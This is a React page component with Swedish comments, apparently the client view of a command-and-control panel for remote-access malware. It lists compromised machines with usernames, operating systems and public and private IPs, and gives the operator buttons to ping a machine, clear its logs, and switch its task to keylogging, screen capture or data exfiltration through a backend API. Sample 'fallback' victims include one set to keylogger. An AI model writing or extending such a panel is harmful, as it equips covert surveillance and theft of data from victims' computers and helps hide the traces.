
import React, { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ClientsList } from "@/components/clients/ClientsList";
import { ClientDetails } from "@/components/clients/ClientDetails";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { SearchIcon } from "lucide-react";
import { toast } from "sonner";

const fetchClients = async () => {
  try {
    // Försök att hämta klienter från server.py
    const response = await fetch('/api/get_clients');
    
    if (!response.ok) {
      console.warn('Fallback: Simulerade klienter används eftersom servern inte svarade');
      // Fallback till simulerade data
      return { 
        clients: generateFallbackClients() 
      };
    }
    
    const result = await response.json();
    if (result.status === "error") {
      throw new Error(result.message || 'Fel vid hämtning av klienter');
    }
    
    // Formatera klienter till rätt format
    const formattedClients = Object.entries(result.clients || {}).map(([id, clientData]) => ({
      id,
      name: clientData.username || 'Okänd',
      os: clientData.system || 'Okänt',
      ip: clientData.public_ip || 'Okänd',
      privateIp: clientData.private_ip || 'Okänd',
      firstSeen: clientData.first_seen || 'Okänd',
      lastSeen: clientData.last_activity || 'Okänd',
      isActive: clientData.is_active === true,
      instruction: clientData.instruction || 'standard',
      ...clientData  // Include all other properties
    }));
    
    return { clients: formattedClients };
  } catch (error) {
    console.error("Error fetching clients:", error);
    // Fallback till simulerade data om hämtningen misslyckades
    return { 
      clients: generateFallbackClients() 
    };
  }
};

// Generera fallback-klienter för att hålla UI funktionell även utan server
function generateFallbackClients() {
  return [
    {
      id: "john_doe",
      name: "John Doe",
      os: "Windows 10",
      ip: "192.168.1.1",
      privateIp: "10.0.0.1",
      firstSeen: "2023-05-15 14:30:00",
      lastSeen: "2023-05-16 08:45:00",
      isActive: true,
      instruction: "standard"
    },
    {
      id: "jane_smith",
      name: "Jane Smith",
      os: "macOS",
      ip: "192.168.1.2",
      privateIp: "10.0.0.2",
      firstSeen: "2023-05-14 09:15:00",
      lastSeen: "2023-05-16 07:30:00",
      isActive: true,
      instruction: "keylogger"
    },
    {
      id: "bob_johnson",
      name: "Bob Johnson",
      os: "Linux",
      ip: "192.168.1.3",
      privateIp: "10.0.0.3",
      firstSeen: "2023-05-10 11:20:00",
      lastSeen: "2023-05-15 16:40:00",
      isActive: false,
      instruction: "standard"
    }
  ];
}

// API-funktion för att pinga en klient
const pingClient = async (clientId) => {
  try {
    const response = await fetch('/api/ping_client', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ client_id: clientId }),
    });
    
    if (!response.ok) {
      throw new Error('Kunde inte pinga klienten');
    }
    
    const result = await response.json();
    return result;
  } catch (error) {
    console.error("Fel vid ping av klient:", error);
    throw error;
  }
};

// API-funktion för att rensa loggar för en klient
const clearClientLogs = async (clientId) => {
  try {
    const response = await fetch('/api/clear_logs', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ client_id: clientId }),
    });
    
    if (!response.ok) {
      throw new Error('Kunde inte rensa klientloggar');
    }
    
    const result = await response.json();
    return result;
  } catch (error) {
    console.error("Fel vid rensning av klientloggar:", error);
    throw error;
  }
};

// API-funktion för att uppdatera instruktion för en klient
const updateClientInstruction = async (clientId, instruction) => {
  try {
    const response = await fetch('/api/update_instruction', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ 
        client_id: clientId,
        instruction: instruction 
      }),
    });
    
    if (!response.ok) {
      throw new Error('Kunde inte uppdatera klientinstruktion');
    }
    
    const result = await response.json();
    return result;
  } catch (error) {
    console.error("Fel vid uppdatering av klientinstruktion:", error);
    throw error;
  }
};

export default function Clients() {
  const [activeTab, setActiveTab] = useState("all");
  const [selectedClient, setSelectedClient] = useState(null);
  const [searchTerm, setSearchTerm] = useState("");
  const [statusFilter, setStatusFilter] = useState("all");
  const [isRefreshing, setIsRefreshing] = useState(false);

  const { data, isLoading, error, refetch } = useQuery({
    queryKey: ['clients'],
    queryFn: fetchClients,
    placeholderData: { clients: [] },
    refetchInterval: 30000, // Uppdatera var 30:e sekund
  });

  const refreshClients = async () => {
    setIsRefreshing(true);
    try {
      await refetch();
      toast.success("Klientlistan uppdaterad");
    } catch (err) {
      toast.error("Fel vid uppdatering av klientlistan");
    } finally {
      setIsRefreshing(false);
    }
  };

  const handlePingClient = async (clientId) => {
    try {
      const result = await pingClient(clientId);
      if (result.status === "success") {
        toast.success(`Klient ${clientId} pingades: ${result.ping_status}`);
        refreshClients();
      } else {
        toast.error(`Fel vid ping av klient: ${result.message}`);
      }
    } catch (error) {
      toast.error(`Fel vid ping av klient: ${error.message}`);
    }
  };

  const handleClearLogs = async (clientId) => {
    if (window.confirm(`Är du säker på att du vill rensa loggarna för klient ${clientId}?`)) {
      try {
        const result = await clearClientLogs(clientId);
        if (result.status === "success") {
          toast.success("Klientloggar rensade");
        } else {
          toast.error(`Fel vid rensning av loggar: ${result.message}`);
        }
      } catch (error) {
        toast.error(`Fel vid rensning av loggar: ${error.message}`);
      }
    }
  };

  const handleUpdateInstruction = async (clientId, instruction) => {
    try {
      const result = await updateClientInstruction(clientId, instruction);
      if (result.status === "success") {
        toast.success(`Instruktion uppdaterad till "${instruction}"`);
        refreshClients();
      } else {
        toast.error(`Fel vid uppdatering av instruktion: ${result.message}`);
      }
    } catch (error) {
      toast.error(`Fel vid uppdatering av instruktion: ${error.message}`);
    }
  };

  const filterClients = (clients) => {
    let filtered = [...clients];
    
    // Filter by search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(client => 
        client.name.toLowerCase().includes(term) || 
        client.id.toLowerCase().includes(term) ||
        client.os.toLowerCase().includes(term)
      );
    }
    
    // Filter by status
    if (statusFilter === "online") {
      filtered = filtered.filter(client => client.isActive);
    } else if (statusFilter === "offline") {
      filtered = filtered.filter(client => !client.isActive);
    }
    
    return filtered;
  };

  const handleClientClick = (clientId) => {
    setSelectedClient(clientId);
  };

  const handleClientBack = () => {
    setSelectedClient(null);
  };

  const clients = data?.clients || [];
  const filteredClients = filterClients(clients);
  const selectedClientData = clients.find(client => client.id === selectedClient);
  
  const onlineCount = clients.filter(c => c.isActive).length;
  const offlineCount = clients.filter(c => !c.isActive).length;
  
  // Om error men vi har fallback-klienter, visa ändå UI med en toast
  if (error && clients.length > 0) {
    toast.error("Fel vid hämtning av klientdata från servern. Visar cachade data.", {
      id: "client-fetch-error",
      duration: 5000,
    });
  }
  
  return (
    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
      <div className="flex items-center justify-between">
        <h2 className="text-3xl font-bold tracking-tight">Klienter</h2>
        <div className="flex items-center space-x-2">
          <Badge variant="outline">
            Totalt: {clients.length}
          </Badge>
          <Badge variant="outline" className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200">
            Online: {onlineCount}
          </Badge>
          <Badge variant="outline" className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200">
            Offline: {offlineCount}
          </Badge>
          <Button 
            variant="outline" 
            size="sm" 
            onClick={refreshClients}
            disabled={isRefreshing}
          >
            {isRefreshing ? "Uppdaterar..." : "Uppdatera"}
          </Button>
        </div>
      </div>

      {!selectedClient ? (
        <>
          <div className="flex flex-col md:flex-row items-center gap-4">
            <div className="relative w-full md:w-96">
              <SearchIcon className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input
                type="search"
                placeholder="Sök klienter..."
                className="w-full pl-8"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>
            <Select
              value={statusFilter}
              onValueChange={setStatusFilter}
            >
              <SelectTrigger className="w-full md:w-40">
                <SelectValue placeholder="Status" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="all">Alla statusar</SelectItem>
                <SelectItem value="online">Online</SelectItem>
                <SelectItem value="offline">Offline</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <Tabs value={activeTab} onValueChange={setActiveTab}>
            <TabsList className="grid w-full md:w-[400px] grid-cols-2">
              <TabsTrigger value="all">Alla klienter</TabsTrigger>
              <TabsTrigger value="active">Aktiva klienter</TabsTrigger>
            </TabsList>
            <TabsContent value="all" className="mt-6">
              {filteredClients.length === 0 && !isLoading ? (
                <Card>
                  <CardContent className="p-6 text-center">
                    <p className="text-muted-foreground">Inga klienter hittades</p>
                    <p className="text-sm text-muted-foreground mt-2">
                      {searchTerm || statusFilter !== "all" 
                        ? "Prova att ändra dina sökfilter" 
                        : "Inga klienter har anslutit till servern ännu"}
                    </p>
                  </CardContent>
                </Card>
              ) : (
                <ClientsList 
                  clients={filteredClients} 
                  isLoading={isLoading} 
                  onClientClick={handleClientClick} 
                />
              )}
            </TabsContent>
            <TabsContent value="active" className="mt-6">
              {filteredClients.filter(client => client.isActive).length === 0 && !isLoading ? (
                <Card>
                  <CardContent className="p-6 text-center">
                    <p className="text-muted-foreground">Inga aktiva klienter hittades</p>
                    <p className="text-sm text-muted-foreground mt-2">
                      {searchTerm 
                        ? "Prova att ändra dina sökfilter" 
                        : "Inga klienter är aktiva just nu"}
                    </p>
                  </CardContent>
                </Card>
              ) : (
                <ClientsList 
                  clients={filteredClients.filter(client => client.isActive)} 
                  isLoading={isLoading} 
                  onClientClick={handleClientClick} 
                />
              )}
            </TabsContent>
          </Tabs>
        </>
      ) : (
        <div className="flex flex-col space-y-6">
          <Button 
            variant="outline" 
            onClick={handleClientBack}
            className="w-24"
          >
            Tillbaka
          </Button>
          {selectedClientData && (
            <div className="space-y-4">
              <div className="flex flex-wrap gap-2">
                <Button 
                  variant="outline" 
                  onClick={() => handlePingClient(selectedClientData.id)}
                >
                  Pinga klient
                </Button>
                <Button 
                  variant="outline" 
                  onClick={() => handleClearLogs(selectedClientData.id)}
                >
                  Rensa loggar
                </Button>
                <Select
                  value={selectedClientData.instruction || "standard"}
                  onValueChange={(value) => handleUpdateInstruction(selectedClientData.id, value)}
                >
                  <SelectTrigger className="w-full md:w-48">
                    <SelectValue placeholder="Instruktionstyp" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="standard">Standard</SelectItem>
                    <SelectItem value="keylogger">Tangentloggare</SelectItem>
                    <SelectItem value="screenshot">Skärmdump</SelectItem>
                    <SelectItem value="exfiltrate">Exfiltrera</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <ClientDetails client={selectedClientData} />
            </div>
          )}
          {!selectedClientData && (
            <Card>
              <CardContent className="p-6">
                <p className="text-center text-muted-foreground">Klienten kunde inte hittas</p>
              </CardContent>
            </Card>
          )}
        </div>
      )}
    </div>
  );
}
